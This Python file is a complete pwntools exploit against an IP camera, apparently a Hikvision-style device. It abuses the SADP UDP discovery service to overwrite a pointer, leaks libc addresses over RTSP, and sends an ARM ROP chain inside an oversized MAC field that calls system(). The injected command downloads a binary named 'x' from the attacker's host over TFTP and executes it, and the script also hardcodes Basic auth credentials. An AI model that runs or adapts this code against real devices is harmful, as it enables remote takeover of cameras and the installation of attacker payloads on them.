from socket import socket, AF_INET, SOCK_DGRAM, SOL_SOCKET, SO_REUSEADDR, SO_BROADCAST
from pwn import *
from textwrap import wrap
import hexdump

context.update(arch='arm', os='linux', endianness='little')

############################# Update! ################################
target_ip="10.42.0.106"                                              # IP address of your cam
host_ip="10.42.0.1"                                                  # Attacker IP
command = 'tftp -r x -g ' + host_ip + ' 9069;chmod +x x;./x' # Command to be executed
######################################################################

adr="rtsp://" + target_ip # username, passwd, etc.
desc="DESCRIBE "+adr+" RTSP/1.0\r\nCSeq: 2\r\nAuthorization: Basic YWRtaW46R0hOWlpZ\r\n\r\n"
play="PLAY "+adr+"/TrackID=12 RTSP/1.0\r\nCSeq: 3\r\nAuthorization: Basic YWRtaW46R0hOWlpZ\r\n\r\n"

time_out = 1
udp_bcast = '239.255.255.250'
udp_port = 37020

def send(custom_xml):
    global time_out,udp_port,udp_bcast
    s = socket.socket(AF_INET, SOCK_DGRAM)
    s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
    s.setsockopt(SOL_SOCKET, SO_BROADCAST, 1)
    s.settimeout(time_out)
    s.bind((host_ip ,0))
    r = s.sendto(custom_xml, (udp_bcast,udp_port ))
    s.close()
    return

def format_addr(a):
    b = p32(a)
    return bytes("%02x-%02x-%02x-%02x" % (b[0], b[1], b[2], b[3]), 'utf-8')

def write_int(i, a):
    custom_xml = b'<?xml version="1.0" encoding="utf-8"?><Probe><Uuid>'+b'a' * 6+b'</Uuid><Types>reset</Types><MAC>----------00-00-00-00-' + format_addr(i) + b'-' + format_addr(a) + b'</MAC></Probe>'
    print("\nSending: ")
    print(custom_xml)
    send(custom_xml)

class Exec_str_ropchain:
    def __init__(self, libc_base, libpthread_base):
        self.libc_base = libc_base
        self.libpthread_base = libpthread_base
        self.set_r4_pc_addr = self.libc_base + 0xc3ec
        self.set_r2_r3_addr = self.libc_base + 0x528c4
        self.str_r2_r3_addr = self.libc_base + 0x2b070
        self.set_r4_r5_r6_addr = self.libc_base + 0xb5f4
        self.mov_r0_r5_addr = self.libc_base + 0x33018
        self.sub_r4_r2_addr = self.libc_base + 0x4c698
        self.system_addr = self.libc_base + 0x522a8
        self.close_addr = self.libc_base + 0x42b74
        self.pthread_exit_addr = self.libpthread_base + 0xc07c
    
    def set_r4_pc(self, r4, pc):
        return p32(r4) + p32(pc)

    def set_r2_r3(self, r2, r3, pc):
        return p32(0xdeadbeef) + p32(pc) + p32(r2) + p32(r3)
    
    def str_r2_r3(self, r4, pc):
        return p32(r4) + p32(pc)

    def set_r4_r5_r6(self, r4, r5, r6, pc):
        return p32(r4) + p32(r5) + p32(r6) + p32(pc)

    def mov_r0_r5(self, r4, r5, pc):
        return p32(r4) + p32(r5) + p32(pc)
    
    def sub_r4_r2(self, r4, r5, pc):
        return p32(r4) + p32(r5) + p32(pc)

    def system(self, r4, r5, pc):
        return p32(r4) + p32(r5) + p32(pc)
    
    def close(self, r4, r7, pc):
        return p32(0xdeadbeef)+ p32(0xdeadbeef)+ p32(0xdeadbeef) + p32(r4) + p32(r7) + p32(pc)

    def split_str(self, s):
        n = 4 - len(s) % 4
        s += " " * n
        sl = wrap(s, 4, drop_whitespace=False)
        return sl

    def make_ropchain(self, str, addr):
        ropchain = b''
        # close(0x11)
        ropchain += p32(self.set_r2_r3_addr)
        ropchain += self.set_r2_r3(0x01010101, 0xdeadbeef, self.set_r4_r5_r6_addr)
        ropchain += self.set_r4_r5_r6(0x01010112, 0xdeadbeef, 0xdeadbeef, self.sub_r4_r2_addr)
        ropchain += self.sub_r4_r2(0xdeadbeef, 0xdeadbeef, self.close_addr)
        # ropchain += self.close(0xdeadbeef, 0xdeadbeef, self.set_r4_pc_addr)

        # mixing both chains
        e_addr = addr - 0x10
        ropchain += self.close(e_addr, 0x10101060, self.set_r2_r3_addr)    

        # Write str at addr and call system(addr) and pthread_exit (disables SADP)
        # e_addr = addr - 0x10
        # ropchain += p32(self.set_r4_pc_addr)
        # ropchain += self.set_r4_pc(e_addr, self.set_r2_r3_addr)
                
        strs = self.split_str(str)
        if len(strs) % 2 == 1:
            strs.append('    ')

        i = 0
        while i < len(strs) - 2:
            s1 = u32(bytes(strs[i], 'utf-8'))
            s2 = u32(bytes(strs[i+1], 'utf-8'))
            e_addr += 8

            ropchain += self.set_r2_r3(s1, s2, self.str_r2_r3_addr)
            ropchain += self.str_r2_r3(e_addr, self.set_r2_r3_addr)

            i += 2

        s1 = u32(bytes(strs[i], 'utf-8'))
        s2 = u32(bytes(strs[i+1], 'utf-8'))
        e_addr += 8

        ropchain += self.set_r2_r3(s1, s2, self.str_r2_r3_addr)
        ropchain += self.str_r2_r3(e_addr, self.set_r4_r5_r6_addr)
        
        ropchain += self.set_r4_r5_r6(0x10101040, addr, 0x10101050, self.mov_r0_r5_addr)
        ropchain += self.mov_r0_r5(0x10101020, 0x10101030, self.system_addr)
        ropchain += self.system(0x10101010, 0x01010101, self.pthread_exit_addr)

        self.ropchain = ropchain



print("Overwriting RTSP response code pointer with GOT pointer...")
write_int(0x2e0684, 0x2E504C) # Points at "415" -0x8

sleep(2)

print("\nLeaking libc and libpthread addresses through RTSP...")
print("Sending: ")
print(bytes(desc, 'utf-8'))

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip, 554))
s.send(bytes(desc, 'utf-8'))
r=s.recv(4096)

print("Received: ")
print(r + b"\n")

print("Sending: ")
print(bytes(play, 'utf-8'))
s.send(bytes(play, 'utf-8'))
r=s.recv(4096)

print("Received: ")
print(r + b"\n")

pthread_attr_setdetachstate_ptr = u32(r[9:13])
setrlimit_ptr = u32(r[13:17])

print("\nLeaked: ")
print("setrlimit @ 0x%x" % setrlimit_ptr)
print("pthread_attr_setdetachstate @ 0x%x" % pthread_attr_setdetachstate_ptr)

pthread_attr_setdetachstate_offset = 0x97c4
libpthread_base = pthread_attr_setdetachstate_ptr - pthread_attr_setdetachstate_offset

setrlimit_offset = 0xf2cc
libc_base = setrlimit_ptr - setrlimit_offset

print("libc base @ 0x%x" % libc_base)
print("libpthread base @ 0x%x" % libpthread_base)

print("\nBuiling ropchain...")
r = Exec_str_ropchain(libc_base, libpthread_base)
r.make_ropchain(command , 0x4f7a9654)
hexdump.hexdump(r.ropchain + b"\n")


custom_xml = b'<?xml version="1.0" encoding="utf-8"?><Probe><Uuid>' + b'a' * 5 + b'</Uuid><Types>reset</Types><MAC>' + b'a' * 228 + r.ropchain + b'</MAC></Probe>'

print("\nSending ropchain...")
print(custom_xml + b"\n")
send(custom_xml)